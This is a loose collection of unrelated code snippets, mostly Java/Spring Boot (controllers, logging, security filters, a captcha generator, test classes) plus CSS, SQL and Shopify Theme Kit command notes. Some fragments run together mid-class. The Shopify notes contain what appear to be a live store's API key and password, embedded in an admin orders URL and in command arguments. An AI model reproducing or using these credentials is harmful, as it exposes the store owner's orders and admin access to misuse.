    public HttpEntity<BootmonClient> create(@RequestBody BootmonClient bootmonClient) {
        bootmonClientService.saveBootmonClient(bootmonClient);

        bootmonClient.add(linkTo(methodOn(BootmonClientController.class)
                .create(bootmonClient))
                .slash(bootmonClient.getName())
                .withSelfRel());

        return new ResponseEntity<>(bootmonClient, HttpStatus.OK);
    }
}

    /**
     * The server adapter.
     */
    private static class ServerAdapter implements ch.qos.logback.access.spi.ServerAdapter {

        /**
         * The HTTP server exchange.
         */
        private final HttpServerExchange exchange;

        /**
         * Constructs an instance.
         *
         * @param exchange the HTTP server exchange.
         */
        private ServerAdapter(HttpServerExchange exchange) {
            this.exchange = exchange;
        }

        /** {@inheritDoc} */
        @Override
        public long getRequestTimestamp() {
            long currentTimeMillis = System.currentTimeMillis();
            long nanoTime = System.nanoTime();
            long requestStartTime = exchange.getRequestStartTime();
            return currentTimeMillis - TimeUnit.NANOSECONDS.toMillis(nanoTime - requestStartTime);
        }

        /** {@inheritDoc} */
        @Override
        public int getStatusCode() {
            return exchange.getStatusCode();
        }

        /** {@inheritDoc} */
        @Override
        public long getContentLength() {
            return exchange.getResponseBytesSent();
        }

        /** {@inheritDoc} */
        @Override
        public Map<String, String> buildResponseHeaderMap() {
            Map<String, String> result = new HashMap<>();
            HeaderMap headers = exchange.getResponseHeaders();
            for (HeaderValues header : headers) {
                result.put(header.getHeaderName().toString(), header.getFirst());
            }
            return result;
        }

    }
	
import net.rakugakibox.spring.boot.logback.access.test.LogbackAccessEventQueuingAppenderRule;
import net.rakugakibox.spring.boot.logback.access.test.LogbackAccessEventQueuingListener;
import net.rakugakibox.spring.boot.logback.access.test.LogbackAccessEventQueuingListenerConfiguration;
import net.rakugakibox.spring.boot.logback.access.test.LogbackAccessEventQueuingListenerRule;
import net.rakugakibox.spring.boot.logback.access.test.TestControllerConfiguration;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.RuleChain;
import org.junit.rules.TestRule;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.rule.OutputCapture;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.context.annotation.Import;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.junit4.SpringRunner;
import static net.rakugakibox.spring.boot.logback.access.test.ResponseEntityAssert.assertThat;
import static org.assertj.core.api.Assertions.assertThat;

/**
 * The base class for testing to use {@code <springProperty>} tag.
 */
@RunWith(SpringRunner.class)
@SpringBootTest(
        value = {
                "logback.access.config=classpath:logback-access.propertied.xml",
                "logback.access.test.console.pattern.prefix=>>>",
                "logback.access.test.console.pattern.suffix=<<<",
        },
        webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT
)
public abstract class AbstractSpringPropertyTest {

    /**
     * The output capture rule.
     */
    private final OutputCapture outputCapture = new OutputCapture();

    /**
     * The REST template.
     */
    @Autowired
    protected TestRestTemplate rest;

    /**
     * Creates a test rule.
     *
     * @return a test rule.
     */
    @Rule
    public TestRule rule() {
        return RuleChain
                .outerRule(new LogbackAccessEventQueuingAppenderRule())
                .around(new LogbackAccessEventQueuingListenerRule())
                .around(outputCapture);
    }

    /**
     * Tests a Logback-access event.
     */
    @Test
    public void logbackAccessEvent() {

        ResponseEntity<String> response = rest.getForEntity("/test/text", String.class);
        LogbackAccessEventQueuingListener.appendedEventQueue.pop();

        assertThat(response).hasStatusCode(HttpStatus.OK);
        assertThat(outputCapture.toString())
                .containsSequence(">>>", "127.0.0.1", "GET", "/test/text", "HTTP/1.1", "200", "<<<");

    }

    /**
     * The base class of context configuration.
     */
    @EnableAutoConfiguration
    @Import({LogbackAccessEventQueuingListenerConfiguration.class, TestControllerConfiguration.class})
    public static abstract class AbstractContextConfiguration {
    }
}
----------------------------------------------------------------------------------------
create table UserConnection (userId varchar(255) not null,
    providerId varchar(255) not null,
    providerUserId varchar(255),
    rank int not null,
    displayName varchar(255),
    profileUrl varchar(512),
    imageUrl varchar(512),
    accessToken varchar(255) not null,
    secret varchar(255),
    refreshToken varchar(255),
    expireTime bigint,
    primary key (userId, providerId, providerUserId));
create unique index UserConnectionRank on UserConnection(userId, providerId, rank);
----------------------------------------------------------------------------------------
import cucumber.api.CucumberOptions;
import cucumber.api.junit.Cucumber;
import org.junit.runner.RunWith;

/**
 * Created by Paul
 *
 * @author <a href="mailto:paul58914080@gmail.com">Paul Williams</a>
 */
@RunWith(Cucumber.class)
@CucumberOptions(features = "classpath:features/MonitoringResource.feature", strict = true,
        plugin = {"json:target/cucumber/MonitoringResource.json", "junit:target/cucumber/MonitoringResource.xml"},
        glue = "classpath:org/ff4j/spring/boot/web/api/resources/monitoring", tags = "@MonitoringResource")
public class RunCucumberMonitoringTest {
}
----------------------------------------------------------------------------------------
import java.util.UUID;

import org.camunda.bpm.engine.ProcessEngine;
import org.springframework.amqp.rabbit.annotation.Exchange;
import org.springframework.amqp.rabbit.annotation.Queue;
import org.springframework.amqp.rabbit.annotation.QueueBinding;
import org.springframework.amqp.rabbit.annotation.RabbitListener;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Profile;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Transactional;

import com.camunda.demo.springboot.ProcessConstants;

@Component
@Profile("!test")
public class AmqpReceiver {

  @Autowired
  private ProcessEngine camunda;

  public AmqpReceiver() {
  }
  
  public AmqpReceiver(ProcessEngine camunda) {
    this.camunda = camunda;
  }
  
  /**
   * Dummy method to handle the shipGoods command message - as we do not have a 
   * shipping system available in this small example
   */
  @RabbitListener(bindings = @QueueBinding( //
      value = @Queue(value = "shipping_create_test", durable = "true"), //
      exchange = @Exchange(value = "shipping", type = "topic", durable = "true"), //
      key = "*"))
  @Transactional  
  public void dummyShipGoodsCommand(String orderId) {
    // and call back directly with a generated transactionId
    handleGoodsShippedEvent(orderId, UUID.randomUUID().toString());
  }

  public void handleGoodsShippedEvent(String orderId, String shipmentId) {
    camunda.getRuntimeService().createMessageCorrelation(ProcessConstants.MSG_NAME_GoodsShipped) //
        .processInstanceVariableEquals(ProcessConstants.VAR_NAME_orderId, orderId) //
        .setVariable(ProcessConstants.VAR_NAME_shipmentId, shipmentId) //
        .correlateWithResult();
  }
}

<plugin>
					<artifactId>maven-compiler-plugin</artifactId>
					<version>2.5.1</version>
					<configuration>
						<source>1.8</source>
						<target>1.8</target>
					</configuration>
					<executions>
						<execution>
							<id>default-compile</id>
							<phase>compile</phase>
							<goals>
								<goal>compile</goal>
							</goals>
						</execution>
						<execution>
							<id>default-testCompile</id>
							<phase>test-compile</phase>
							<goals>
								<goal>testCompile</goal>
							</goals>
						</execution>
					</executions>
				</plugin>
----------------------------------------------------------------------------------------
   private static String formatBytes(long bytes) {
        if (bytes < 1024){
            return bytes + "B";
        }
        int unit = (63 - Long.numberOfLeadingZeros(bytes)) / 10;
        return String.format("%.1f%sB", (double)bytes / (1L << (unit * 10)), " KMGTPE".charAt(unit));
    }
----------------------------------------------------------------------------------------
package net.bndy.wf.exceptions;

import net.bndy.wf.lib.annotation.*;

public enum OAuthExceptionType {

	@Description(value = "Invalid client id or redirect uri.")
	InvalidClientIDOrRedirectUri,

	@Description(value = "Invalid authorization code.")
	InvalidAuthorizationCode,

	@Description(value = "Invalid access token.")
	InvalidAccessToken,
	
	@Description(value = "Invalid user.")
	InvalidUser,
}
----------------------------------------------------------------------------------------
940695e0b1ff9150d1884103a38bf271
https://apps.shopify.com/?utm_content=contextual&utm_medium=shopify&utm_source=admin

theme open --env=production # will open http://your-store.myshopify.com?preview_theme_id=<your-theme-id>

aeb1bcfb9a36e501f44c0fa3c0599397

81036705927

https://940695e0b1ff9150d1884103a38bf271:aeb1bcfb9a36e501f44c0fa3c0599397@formero.myshopify.com/admin/api/2019-10/orders.json

theme deploy --env=production
theme update --version=v1.0.2
theme new --password=aeb1bcfb9a36e501f44c0fa3c0599397 --store=formero.myshopify.com --name=FormeroTheme
theme get --list -p=[your-password] -s=[you-store.myshopify.com]
theme get -p=[your-password] -s=[you-store.myshopify.com] -t=[your-theme-id]
theme configure --password=[your-api-password] --store=[your-store.myshopify.com] --themeid=[your-theme-id]
theme watch --notify=/tmp/theme.update
theme remove templates/404.liquid templates/article.liquid
theme download templates/404.liquid
theme watch
theme upload */*
theme get --password=aeb1bcfb9a36e501f44c0fa3c0599397 --store=formero.myshopify.com --themeid=81036705927

shopify-themekit <args>

https://github.com/Shopify/node-themekit
https://shopify.github.io/themekit/commands/
----------------------------------------------------------------------------------------
import java.awt.Color;
import java.awt.Graphics;

import util.Renderable;

/**
 * A class used to define the constraints of the in-game world and how to render it to the canvas.
 * @author nicholasadamou
 *
 */
public class World implements Renderable
{
	public static final int TILE_WIDTH = 15;
	public static final int TILE_HEIGHT = 15;
	public static final int WORLD_WIDTH = 25;
	public static final int WORLD_HEIGHT = 25;

	
	@Override
	public void render(Graphics g)
	{
		g.setColor(Color.white);

		g.drawRect(0, 0, WORLD_WIDTH * TILE_WIDTH, WORLD_HEIGHT * TILE_HEIGHT);

		for (int x = TILE_WIDTH; x < WORLD_WIDTH * TILE_WIDTH; x += TILE_WIDTH)
			g.drawLine(x, 0, x, WORLD_WIDTH * TILE_WIDTH);
		for (int y = TILE_HEIGHT; y < WORLD_HEIGHT * TILE_HEIGHT; y += TILE_HEIGHT)
			g.drawLine(0, y, WORLD_HEIGHT * TILE_HEIGHT, y);
	}
}
import java.awt.Color;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.font.FontRenderContext;
import java.awt.geom.AffineTransform;

public class Util
{
	/**
	 * Prints a message to the console.
	 * 
	 * @param msg The message to print to the console.
	 */
	public static void printMessage(String msg)
	{
		System.out.println(msg);
	}

	/**
	 * Draws a standard message to the canvas at a specific x-coordinate and y-coordinate that is not Off set by a certain value.
	 * 
	 * @param g The Graphics class use to draw to the canvas.
	 * @param textColor The color of the text on the canvas.
	 * @param msg The text to be displayed on the canvas.
	 * @param fontFamily The font family of the text.
	 * @param fontSize The size of the font to be drawn to the canvas.
	 * @param x The x-coordinate on the canvas.
	 * @param y The y-coordinate on the canvas.
	 */
	public static void simpleMessage(Graphics g, Color textColor, String msg, String fontFamily, int fontSize, int x,
			int y)
	{
		g.setColor(textColor);
		g.setFont(new Font(fontFamily, Font.PLAIN, fontSize));
		g.drawString(msg, x, y);
	}

	/**
	 * Draws a message to the canvas at a specific x-coordinate and y-coordinate that is not Off set by a certain value.
	 * 
	 * @param g The Graphics class use to draw to the canvas.
	 * @param textColor The color of the text on the canvas.
	 * @param msg The text to be displayed on the canvas.
	 * @param fontFamily The font family of the text.
	 * @param fontSize The size of the font to be drawn to the canvas.
	 * @param x The x-coordinate on the canvas.
	 * @param textOffset The offset in the x-plane
	 * @param y The y-coordinate on the canvas.
	 */
	public static void complexMessage(Graphics g, Color textColor, String msg, String fontFamily, int fontSize, int x,
			int textOffset, int y)
	{
		int textWidth = (int) (new Font(fontFamily, Font.PLAIN, fontSize)
				.getStringBounds(msg, new FontRenderContext(new AffineTransform(), true, true)).getWidth());

		g.setColor(textColor);
		g.drawString(msg, x - textWidth - textOffset, y);
	}

	/**
	 * Calculates the width of a string of text in respect to its font metrics.
	 * @param msg The message to calculate the width of.
	 * @return The width of the screen.
	 */
	public static int getWidthOfString(String msg)
	{
		AffineTransform affinetransform = new AffineTransform();
		FontRenderContext frc = new FontRenderContext(affinetransform, true, true);
		Font font = new Font("Tahoma", Font.PLAIN, 12);

		return (int) (font.getStringBounds(msg, frc).getWidth());

	}

	/**
	 * Calculates the height of a string of text in respect to its font metrics.
	 * @param msg The message to calculate the height of.
	 * @return The height of the screen.
	 */
	public static int getHeightOfString(String msg)
	{
		AffineTransform affinetransform = new AffineTransform();
		FontRenderContext frc = new FontRenderContext(affinetransform, true, true);
		Font font = new Font("Tahoma", Font.PLAIN, 12);

		return (int) (font.getStringBounds(msg, frc).getHeight());
	}
}
----------------------------------------------------------------------------------------
  @ExceptionHandler({OptionalNotPresentException.class})
    @ResponseStatus(HttpStatus.NOT_FOUND)
    public ModelAndView handlerUnauthenticatedException(Exception ex, NativeWebRequest request) {
        if ((request.getHeader("accept").contains("application/json"))) {
            MappingJackson2JsonView view = new MappingJackson2JsonView();
            Map<String, Serializable> attributes = new HashMap<>();
            attributes.put("error", HttpStatus.NOT_FOUND);
            view.setAttributesMap(attributes);
            return new ModelAndView(view);
        } else {
            return new ModelAndView("/404");
        }
    }
----------------------------------------------------------------------------------------
@KafkaListener(id = "messageReturned", topics = "someTopic")
public Message<?> listen(String in, @Header(KafkaHeaders.REPLY_TOPIC) byte[] replyTo,
        @Header(KafkaHeaders.CORRELATION_ID) byte[] correlation) {
    return MessageBuilder.withPayload(in.toUpperCase())
            .setHeader(KafkaHeaders.TOPIC, replyTo)
            .setHeader(KafkaHeaders.MESSAGE_KEY, 42)
            .setHeader(KafkaHeaders.CORRELATION_ID, correlation)
            .setHeader("someOtherHeader", "someValue")
            .build();
}
----------------------------------------------------------------------------------------
import com.github.izhangzhihao.SSMSeedProject.Utils.SHAUtils;
import lombok.extern.slf4j.Slf4j;
import org.jetbrains.annotations.NotNull;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.AuthenticationServiceException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;
import org.springframework.security.web.util.matcher.AntPathRequestMatcher;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@Slf4j
//@Component
public class AuthenticationFilter extends UsernamePasswordAuthenticationFilter {

    @Autowired
    @Override
    public void setAuthenticationManager(AuthenticationManager authenticationManager) {
        super.setAuthenticationManager(authenticationManager);
    }

    @Override
    protected String obtainPassword(HttpServletRequest request) {
        return SHAUtils.getSHA_256(request.getParameter("Password"));
    }

    @Override
    protected String obtainUsername(HttpServletRequest request) {
        return request.getParameter("UserName");
    }

    @NotNull
    private String obtainValidateCode(HttpServletRequest request) {
        return request.getParameter("validateCode");
    }

    public AuthenticationFilter() {
        super();
        setRequiresAuthenticationRequestMatcher(new AntPathRequestMatcher("/login", "POST"));
    }

    @Override
    public Authentication attemptAuthentication(HttpServletRequest request, HttpServletResponse response) throws AuthenticationException {
        if (!request.getMethod().equals("POST")) {
            throw new AuthenticationServiceException(
                    "Authentication method not supported: " + request.getMethod());
        }
        String userValidateCode = obtainValidateCode(request);
        String serverValidateCode = request.getSession().getAttribute("validateCode").toString();

        if (!userValidateCode.equalsIgnoreCase(serverValidateCode)) {
            throw new ValidateCodeNotMatchException("validate code not match");
        }

        String username = obtainUsername(request);
        String password = obtainPassword(request);

        if (username == null) {
            username = "";
        }

        if (password == null) {
            password = "";
        }

        username = username.trim();

        UsernamePasswordAuthenticationToken authRequest = new UsernamePasswordAuthenticationToken(username, password);

        // Allow subclasses to set the "details" property
        setDetails(request, authRequest);

//        log.warn(getAuthenticationManager().toString());
//
//        Authentication authenticate = getAuthenticationManager()
//                .authenticate(
//                        authRequest);

        return authRequest;
    }
}
----------------------------------------------------------------------------------------
import java.awt.*;
import java.awt.image.BufferedImage;
import java.util.Random;

/**
 * 验证码生成器类，可生成数字、大写、小写字母及三者混合类型的验证码。 支持自定义验证码字符数量； 支持自定义验证码图片的大小； 支持自定义需排除的特殊字符；
 * 支持自定义干扰线的数量； 支持自定义验证码图文颜色
 */
@SuppressWarnings("WeakerAccess")
public class ValidateCode {

    /**
     * 验证码类型为仅数字 0~9
     */
    public static final int TYPE_NUM_ONLY = 0;

    /**
     * 验证码类型为仅字母，即大写、小写字母混合
     */
    public static final int TYPE_LETTER_ONLY = 1;

    /**
     * 验证码类型为数字、大写字母、小写字母混合
     */
    public static final int TYPE_ALL_MIXED = 2;

    /**
     * 验证码类型为数字、大写字母混合
     */
    public static final int TYPE_NUM_UPPER = 3;

    /**
     * 验证码类型为数字、小写字母混合
     */
    public static final int TYPE_NUM_LOWER = 4;

    /**
     * 验证码类型为仅大写字母
     */
    public static final int TYPE_UPPER_ONLY = 5;

    /**
     * 验证码类型为仅小写字母
     */
    public static final int TYPE_LOWER_ONLY = 6;

    private ValidateCode() {

    }

    /**
     * 生成验证码字符串
     *
     * @param type    验证码类型，参见本类的静态属性
     * @param length  验证码长度，大于0的整数
     * @param exChars 需排除的特殊字符（仅对数字、字母混合型验证码有效，无需排除则为null）
     * @return 验证码字符串
     */
    public static String generateTextCode(int type, int length, String exChars) {

        if (length <= 0)
            return "";

        StringBuilder code = new StringBuilder();
        int i = 0;
        Random r = new Random();

        switch (type) {

            // 仅数字
            case TYPE_NUM_ONLY:
                while (i < length) {
                    int t = r.nextInt(10);
                    if (exChars == null || !exChars.contains(t + "")) {// 排除特殊字符
                        code.append(t);
                        i++;
                    }
                }
                break;

            // 仅字母（即大写字母、小写字母混合）
            case TYPE_LETTER_ONLY:
                while (i < length) {
                    int t = r.nextInt(123);
                    if ((t >= 97 || (t >= 65 && t <= 90)) && (exChars == null || exChars.indexOf((char) t) < 0)) {
                        code.append((char) t);
                        i++;
                    }
                }
                break;

            // 数字、大写字母、小写字母混合
            case TYPE_ALL_MIXED:
                while (i < length) {
                    int t = r.nextInt(123);
                    if ((t >= 97 || (t >= 65 && t <= 90) || (t >= 48 && t <= 57))
                            && (exChars == null || exChars.indexOf((char) t) < 0)) {
                        code.append((char) t);
                        i++;
                    }
                }
                break;

            // 数字、大写字母混合
            case TYPE_NUM_UPPER:
                while (i < length) {
                    int t = r.nextInt(91);
                    if ((t >= 65 || (t >= 48 && t <= 57)) && (exChars == null || exChars.indexOf((char) t) < 0)) {
                        code.append((char) t);
                        i++;
                    }
                }
                break;

            // 数字、小写字母混合
            case TYPE_NUM_LOWER:
                while (i < length) {
                    int t = r.nextInt(123);
                    if ((t >= 97 || (t >= 48 && t <= 57)) && (exChars == null || exChars.indexOf((char) t) < 0)) {
                        code.append((char) t);
                        i++;
                    }
                }
                break;

            // 仅大写字母
            case TYPE_UPPER_ONLY:
                while (i < length) {
                    int t = r.nextInt(91);
                    if ((t >= 65) && (exChars == null || exChars.indexOf((char) t) < 0)) {
                        code.append((char) t);
                        i++;
                    }
                }
                break;

            // 仅小写字母
            case TYPE_LOWER_ONLY:
                while (i < length) {
                    int t = r.nextInt(123);
                    if ((t >= 97) && (exChars == null || exChars.indexOf((char) t) < 0)) {
                        code.append((char) t);
                        i++;
                    }
                }
                break;

        }

        return code.toString();
    }

    /**
     * 已有验证码，生成验证码图片
     *
     * @param textCode       文本验证码
     * @param width          图片宽度
     * @param height         图片高度
     * @param interLine      图片中干扰线的条数
     * @param randomLocation 每个字符的高低位置是否随机
     * @param backColor      图片颜色，若为null，则采用随机颜色
     * @param foreColor      字体颜色，若为null，则采用随机颜色
     * @param lineColor      干扰线颜色，若为null，则采用随机颜色
     * @return 图片缓存对象
     */
    public static BufferedImage generateImageCode(String textCode, int width, int height, int interLine,
                                                  boolean randomLocation, Color backColor, Color foreColor, Color lineColor) {

        BufferedImage bim = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
        Graphics g = bim.getGraphics();

        // 画背景图
        g.setColor(backColor == null ? getRandomColor() : backColor);
        g.fillRect(0, 0, width, height);

        // 画干扰线
        Random r = new Random();
        if (interLine > 0) {

            int x = 0, y = 0, x1 = width, y1 = 0;
            for (int i = 0; i < interLine; i++) {
                g.setColor(lineColor == null ? getRandomColor() : lineColor);
                y = r.nextInt(height);
                y1 = r.nextInt(height);

                g.drawLine(x, y, x1, y1);
            }
        }

        // 写验证码

        // g.setColor(getRandomColor());
        // g.setColor(isSimpleColor?Color.BLACK:Color.WHITE);

        // 字体大小为图片高度的80%
        int fontSize = (int) (height * 0.8);
        int fx = height - fontSize;
        int fy = fontSize;

        g.setFont(new Font("Default", Font.PLAIN, fontSize));

        // 写验证码字符
        for (int i = 0; i < textCode.length(); i++) {
            fy = randomLocation ? (int) ((Math.random() * 0.3 + 0.6) * height) : fy;// 每个字符高低是否随机
            g.setColor(foreColor == null ? getRandomColor() : foreColor);
            g.drawString(textCode.charAt(i) + "", fx, fy);
            fx += fontSize * 0.9;
        }

        g.dispose();

        return bim;
    }

    /**
     * 生成图片验证码
     *
     * @param type           验证码类型，参见本类的静态属性
     * @param length         验证码字符长度，大于0的整数
     * @param exChars        需排除的特殊字符
     * @param width          图片宽度
     * @param height         图片高度
     * @param interLine      图片中干扰线的条数
     * @param randomLocation 每个字符的高低位置是否随机
     * @param backColor      图片颜色，若为null，则采用随机颜色
     * @param foreColor      字体颜色，若为null，则采用随机颜色
     * @param lineColor      干扰线颜色，若为null，则采用随机颜色
     * @return 图片缓存对象
     */
    public static BufferedImage generateImageCode(int type, int length, String exChars, int width, int height,
                                                  int interLine, boolean randomLocation, Color backColor, Color foreColor, Color lineColor) {

        String textCode = generateTextCode(type, length, exChars);

        return generateImageCode(textCode, width, height, interLine, randomLocation, backColor, foreColor,
                lineColor);
    }

    /**
     * 产生随机颜色
     *
     * @return 颜色
     */
    private static Color getRandomColor() {
        Random r = new Random();
        return new Color(r.nextInt(255), r.nextInt(255), r.nextInt(255));
    }
}
----------------------------------------------------------------------------------------
:host,

:root {
  --scrollbar-color: var(--opera-dark-scrollbar-color);

  --scrollbar-hover-color: var(--opera-dark-scrollbar-hover-color);

}

 

:host-context(html.dark-theme) {
  --scrollbar-color: var(--opera-light-scrollbar-color);

  --scrollbar-hover-color: var(--opera-light-scrollbar-hover-color);

}

 

::-webkit-scrollbar {
  height: 12px;

  width: 12px;

}

 

::-webkit-scrollbar-thumb {
  background-clip: padding-box;

  background-color: var(--scrollbar-color);

  border: 2px solid transparent;

  border-radius: 10px;

}

 

::-webkit-scrollbar-thumb:hover {
  background-color: var(--scrollbar-hover-color);

}

 

::-webkit-scrollbar-corner {
  background-color: transparent;

}

 

var restman = restman || {};

restman.ui = restman.ui || {};

 

(function() {
    'use strict';

 

    restman.ui.editors = {
        _editors: {},

 

        create: function(textareaId, readonly) {
            var options = { 'lineNumbers': true, 'matchBrackets': true }

            if (readonly) {
                options['readOnly'] = true;

            }

            restman.ui.editors._editors[textareaId] = CodeMirror.fromTextArea($(textareaId)[0], options);

            return textareaId;

        },

 

        get: function(id) {
            return restman.ui.editors._editors[id];

        },

 

        setValue: function(id, value) {
            var e = restman.ui.editors.get(id);

            e.setValue(value);

            e.refresh();

        }

    };

})();
----------------------------------------------------------------------------------------
[class^="icon-"]:before, [class*=" icon-"]:before {

    /* use !important to prevent issues with browser extensions that change fonts */

    font-family: 'icomoon' !important;

    speak: none;

    font-style: normal;

    font-weight: normal;

    font-variant: normal;

    text-transform: none;

    line-height: 1;

 

    /* Better Font Rendering =========== */

    -webkit-font-smoothing: antialiased;

    -moz-osx-font-smoothing: grayscale;

}
----------------------------------------------------------------------------------------
import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import reactor.core.publisher.Flux;
import reactor.core.publisher.FluxProcessor;
import reactor.core.publisher.Mono;
import reactor.core.publisher.ReplayProcessor;
import reactor.core.publisher.UnicastProcessor;
import reactor.core.scheduler.Schedulers;
import ru.lanwen.micronaut.commands.AccountCommand;
import ru.lanwen.micronaut.events.AccountEvent;

import javax.annotation.PostConstruct;
import javax.inject.Inject;
import javax.inject.Singleton;
import java.util.concurrent.atomic.AtomicInteger;

@Slf4j
@Singleton
@RequiredArgsConstructor
public class EventStream {

    @Inject
    final AccountAggregator accountAggregator;

    @Inject
    final TransactionsAggregator transactionsAggregator;

    @Getter
    AtomicInteger offset = new AtomicInteger(0);

    FluxProcessor<AccountCommand, AccountCommand> commandsProcessor = UnicastProcessor.create();

    FluxProcessor<AccountEvent, AccountEvent> eventsProcessor = ReplayProcessor.create(Integer.MAX_VALUE);

    @PostConstruct
    public void init() {
        commandsProcessor
                .publishOn(Schedulers.newSingle("commands"))
                .flatMap(command -> Flux.concat(
                        transactionsAggregator.process(command),
                        accountAggregator.process(command)
                ))
                .delayUntil(event -> Flux.concat(
                        accountAggregator.accept(event),
                        transactionsAggregator.accept(event)
                ))
                .doOnNext(event -> offset.getAndIncrement())
                .subscribe(eventsProcessor);
    }

    public Mono<Void> submit(AccountCommand command) {
        return Mono.fromRunnable(() -> commandsProcessor.onNext(command));
    }

    public Flux<AccountEvent> events() {
        return eventsProcessor.take(offset.get());
    }
}
----------------------------------------------------------------------------------------

	public static WebClient buildWebClient(String url) {
		ReactorClientHttpConnector connector = new ReactorClientHttpConnector(
				options -> options.option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 3000));
		return WebClient.builder().clientConnector(connector).baseUrl(url).build();
	}
	
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.data.mongodb.core.ReactiveMongoOperations;
import org.springframework.data.mongodb.core.query.Criteria;
import org.springframework.data.mongodb.core.query.Query;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.reactive.EnableWebFluxSecurity;
import org.springframework.security.config.web.server.ServerHttpSecurity;
import org.springframework.security.core.userdetails.ReactiveUserDetailsService;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.web.server.SecurityWebFilterChain;

import ch.xxx.trader.PasswordEncryption;
import reactor.core.publisher.Mono;

//@EnableWebSecurity
//@EnableWebFluxSecurity
public class WebfluxSecurityConfig {
	
	@Autowired
	private ReactiveMongoOperations operations;
	@Autowired
	private PasswordEncryption passwordEncryption;
	
	@Bean
	public ReactiveUserDetailsService userDetailsRepository() {
		return new ReactiveUserDetailsService() {
			
			@Override
			public Mono<UserDetails> findByUsername(String username) {
				Query query = new Query();
				query.addCriteria(Criteria.where("userId").is(username));
				return operations.findOne(query, UserDetails.class);
			}
		};
	}			
	
	@Bean
	public SecurityWebFilterChain springSecurityFilterChain(ServerHttpSecurity http) {
		http
			.authorizeExchange()
				.anyExchange().authenticated()
				.and()
			.httpBasic();
		return http.build();
	}
}
----------------------------------------------------------------------------------------
final LoggerContext factory = (LoggerContext) LoggerFactory.getILoggerFactory();
final Logger root = factory.getLogger(Logger.ROOT_LOGGER_NAME);

final InstrumentedAppender metrics = new InstrumentedAppender(registry);
metrics.setContext(root.getLoggerContext());
metrics.start();
root.addAppender(metrics);
----------------------------------------------------------------------------------------
import com.cloudant.client.api.ClientBuilder;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.context.web.SpringBootServletInitializer;
import org.springframework.context.annotation.Bean;

import com.cloudant.client.api.CloudantClient;
import com.cloudant.client.api.Database;
import org.springframework.context.annotation.Profile;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.binary.StringUtils;


@SpringBootApplication
public class Application extends SpringBootServletInitializer {

	private final static String KUBE_CLOUDANT_SECRETS_FILE = "/etc/cloudant-secrets/binding";

	public static void main(String[] args) throws Exception {
		SpringApplication.run(Application.class, args);
	}


	@Profile("kubernetes")
	@Bean
	/*
	 * Load the CloudantClient from the Kubernetes Secrets file.
	 * This method is only loaded when the kubernetes profile is activated
	 */
	public CloudantClient client() throws IOException {

		String secrets = readKubeSecretsFiles();
		String secretsJson = StringUtils.newStringUtf8(Base64.decodeBase64(secrets));
		ObjectMapper mapper = new ObjectMapper();
		Map<String, Object> map = new HashMap<String, Object>();

		// convert JSON string to Map
		map = mapper.readValue(secretsJson, new TypeReference<Map<String, String>>(){});

		String username = (String) map.get("username");
		String password = (String) map.get("password");
		String url = "http://" + map.get("username") + ".cloudant.com";

		return ClientBuilder.url(new URL(url))
				.username(username)
				.password(password)
				.build();
	}

	@Bean
	public Database account(CloudantClient cloudant) throws MalformedURLException {
		return cloudant.database("account", true);
	}

	private String readKubeSecretsFiles() throws IOException {
		BufferedReader br = new BufferedReader(new FileReader(KUBE_CLOUDANT_SECRETS_FILE));

		StringBuilder sb = new StringBuilder();
		String line = br.readLine();

		while (line != null) {
			sb.append(line);
			sb.append(System.lineSeparator());
			line = br.readLine();
		}
		String everything = sb.toString();
		br.close();

		return everything;
	}
}
----------------------------------------------------------------------------------------
import com.ixortalk.aws.cognito.boot.filter.AwsCognitoIdTokenProcessor;
import com.ixortalk.aws.cognito.boot.filter.AwsCognitoJwtAuthenticationFilter;
import com.nimbusds.jose.jwk.source.JWKSource;
import com.nimbusds.jose.jwk.source.RemoteJWKSet;
import com.nimbusds.jose.proc.JWSKeySelector;
import com.nimbusds.jose.proc.JWSVerificationKeySelector;
import com.nimbusds.jose.util.DefaultResourceRetriever;
import com.nimbusds.jose.util.ResourceRetriever;
import com.nimbusds.jwt.proc.ConfigurableJWTProcessor;
import com.nimbusds.jwt.proc.DefaultJWTProcessor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Scope;
import org.springframework.context.annotation.ScopedProxyMode;

import java.net.MalformedURLException;
import java.net.URL;

import static com.nimbusds.jose.JWSAlgorithm.RS256;

@Configuration
@ConditionalOnClass({AwsCognitoJwtAuthenticationFilter.class, AwsCognitoIdTokenProcessor.class})
@EnableConfigurationProperties({AwsCognitoJtwConfiguration.class})
